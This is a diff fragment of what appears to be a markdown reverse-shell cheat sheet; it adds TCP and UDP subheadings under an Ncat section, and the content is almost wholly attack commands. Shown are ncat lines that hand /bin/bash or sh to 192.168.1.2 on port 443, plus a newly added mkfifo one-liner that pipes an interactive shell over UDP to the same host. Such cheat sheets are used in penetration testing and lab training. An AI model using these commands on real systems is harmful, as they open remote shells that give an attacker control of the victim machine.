@@ -413,12 +413,20 @@
   
   # <kbd>Ncat</kbd>
 
+  # <kbd>TCP</kbd>
+   
   ```cmd
   ncat 192.168.1.2 443 -e /bin/bash
   
   ncat 192.168.1.2 443 -e sh
   ```
   
+  # <kbd>UDP</kbd>
+   
+  ```cmd 
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 192.168.1.2 443 >/tmp/f
+  ```
+   
   ---
   
   # <kbd>PowerShell</kbd>
